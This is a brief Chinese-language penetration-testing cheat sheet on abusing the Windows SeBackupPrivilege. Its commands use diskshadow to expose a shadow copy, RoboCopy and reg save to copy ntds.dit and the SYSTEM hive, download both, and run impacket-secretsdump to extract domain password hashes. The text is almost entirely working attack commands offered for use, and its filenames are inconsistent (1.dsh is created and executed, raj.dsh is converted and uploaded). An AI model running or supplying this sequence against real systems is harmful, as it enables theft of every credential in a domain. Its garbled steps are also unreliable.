whoami /priv
* 具有 `SeBackupPriviledge` 权限时
```bash
# 本地创建一个 1.dsh 文件，内容如下：

set context persistent nowriters
add volume c: alias 1
create
expose %1% z:

# 再用unix2dos将dsh文件的编码间距转换为Windows兼容的编码和间距
unix2dos raj.dsh

# 然后上传该 dsh 文件
upload raj.dsh
# 执行该文件内容
diskshadow /s 1.dsh

# 使用 RoboCopy 将文件复制到临时目录
RoboCopy /b z:\windows\ntds . ntds.dit
# 再导出 system 文件
reg save HKLM\SYSTEM C:\tmp\system

# 然后分别下载到本地
download C:/tmp/ntds.dit ntds.dit
download C:/tmp/system system

# 最后通过 secretsdump 提取哈希值
impacket-secretsdump -ntds ntds.dit -system system local
```
